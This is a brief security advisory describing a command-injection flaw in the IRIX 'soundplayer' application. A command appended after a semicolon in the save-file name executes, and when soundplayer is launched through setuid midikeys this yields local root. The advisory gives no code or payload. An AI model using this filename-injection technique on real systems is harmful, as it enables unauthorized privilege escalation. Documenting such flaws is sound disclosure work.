#SGI's Irix operating system ships with an X11 application called 'soundplayer' which is used to play .WAV files. It is not setuid root by itself, but can inherit root privileges if called by midikeys (which is setuid on some old IRIX systems). Soundplayer is vulnerable to an input validation problem. When saving a file to disk with soundplayer, if a semicolon is appended to the end of the "proper" or "real" filename input followed by a command to be executed (no spaces), the command will run with the privileges soundplayer has (elevated or not). It is possible to compromise root access locally through exploitation of this vulnerability if soundplayer is executed (then exploited..) through setuid midikeys.
